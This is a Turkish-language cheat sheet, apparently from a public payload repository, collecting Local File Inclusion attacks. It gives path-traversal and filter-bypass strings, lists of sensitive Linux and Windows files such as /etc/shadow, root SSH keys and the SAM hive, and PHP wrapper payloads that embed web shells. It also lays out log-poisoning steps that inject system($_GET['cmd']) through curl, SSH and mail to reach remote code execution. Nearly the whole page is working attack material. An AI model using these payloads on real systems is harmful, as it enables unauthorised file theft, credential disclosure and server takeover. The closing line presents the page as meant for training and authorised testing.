# 📂 LFI (Yerel Dosya Dahil Etme) Payload Koleksiyonu

[🇬🇧 English](../LFI.md)

```
  ██╗     ███████╗██╗    ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗
  ██║     ██╔════╝██║    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝
  ██║     █████╗  ██║    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║███████╗
  ██║     ██╔══╝  ██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║╚════██║
  ███████╗██║     ██║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝███████║
  ╚══════╝╚═╝     ╚═╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
```

---

## 🐧 Linux Dosyaları

### Temel Dizin Gezinimi (Basic Traversal)
```
/etc/passwd
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd
```

### URL Kodlamalı (URL Encoded)
```
..%2F..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

### Filtre Atlatma Teknikleri (Bypass)
```
....//....//....//etc/passwd
..././..././..././etc/passwd
....\/....\/....\/etc/passwd
..%c0%af..%c0%afetc/passwd
..%ef%bc%8f..%ef%bc%8fetc/passwd
/etc/passwd%00
/etc/passwd%00.jpg
/etc/passwd%00.php
```

### Önemli ve Hassas Linux Dosyaları
```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/group
/etc/resolv.conf
/etc/crontab
/etc/ssh/sshd_config
/etc/ssh/ssh_config
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/mysql/my.cnf
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/0
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/auth.log
/var/log/syslog
/home/user/.ssh/id_rsa
/home/user/.bash_history
/root/.bash_history
/root/.ssh/id_rsa
```

---

## 🪟 Windows Dosyaları

### Temel Dizin Gezinimi
```
C:\Windows\System32\drivers\etc\hosts
C:/Windows/System32/drivers/etc/hosts
..\..\..\..\Windows\System32\drivers\etc\hosts
....\\....\\....\\Windows\\System32\\drivers\\etc\\hosts
```

### Önemli ve Hassas Windows Dosyaları
```
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SECURITY
C:\Windows\repair\SAM
C:\Windows\repair\SYSTEM
C:\Windows\win.ini
C:\Windows\system.ini
C:\boot.ini
C:\inetpub\logs\LogFiles
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf
C:\xampp\php\php.ini
C:\Program Files\FileZilla Server\FileZilla Server.xml
```

---

## 🔄 Sarmalayıcılar (PHP Wrappers)

### php://filter (Kaynak Kod Okuma)
```
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=index.php
php://filter/convert.iconv.utf-8.utf-16/resource=index.php
php://filter/read=convert.base64-encode/resource=../config.php
```

### php://input (Uzaktan Kod Çalıştırma - RCE)
```
php://input
POST verisi: <?php system('id'); ?>
```

### data:// Sarmalayıcısı
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
data://text/plain,<?php system($_GET['cmd']); ?>
```

### expect:// (RCE)
```
expect://id
expect://whoami
```

### zip:// Sarmalayıcısı
```
zip://path/to/file.zip%23shell.php
```

### phar:// Sarmalayıcısı
```
phar://uploads/shell.jpg/test.php
```

---

## 🔥 Log Zehirleme (Log Poisoning ile RCE)

### Apache Erişim Logu (Access Log)
```bash
# 1. User-Agent başlığı üzerinden PHP kodu enjekte edin
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# 2. Log dosyasını LFI ile dahil edin
?page=/var/log/apache2/access.log&cmd=id
```

### SSH Logu
```bash
# 1. SSH kullanıcı adı üzerinden kod enjekte edin
ssh '<?php system($_GET["cmd"]);?>'@target.com

# 2. Log dosyasını dahil edin
?page=/var/log/auth.log&cmd=id
```

### E-Posta Logu (Mail Log)
```bash
# 1. Zehirlenmiş e-posta gönderin
mail -s "<?php system(\$_GET['cmd']); ?>" target@localhost

# 2. Log dosyasını dahil edin
?page=/var/log/mail.log&cmd=id
```

### Proc Environ
```
?page=/proc/self/environ
# User-Agent başlığı: <?php system('id'); ?>
```

---

## 📊 Hızlı Başvuru

### Tespit (Detection)
```
?page=../../../etc/passwd
?file=....//....//etc/passwd
?path=/etc/passwd%00
```

### Filtre Atlatma Tablosu
| Filtreleme Kuralı | Atlatma Yöntemi |
|-------------------|-----------------|
| `../` engellenmiş | `....//`, `..././` |
| `.php` uzantısı zorunlu | `%00` (null byte), soru işareti (`?`), diyez (`#`) |
| Beyaz Liste kontrolü | `php://` sarmalayıcıları, dosya yükleme yolları |

### Sıkça Karşılaşılan Parametreler
```
page, file, path, include, doc
document, folder, root, pg, style
template, view, content, load
```

---

## 📚 Kaynaklar

- [PayloadsAllTheThings LFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [HackTricks LFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion)

---

<p align="center">
  <b>📂 LFI Payload Arsenal</b><br>
  <i>Yalnızca eğitim ve yetkili güvenlik testleri amaçlıdır!</i>
</p>
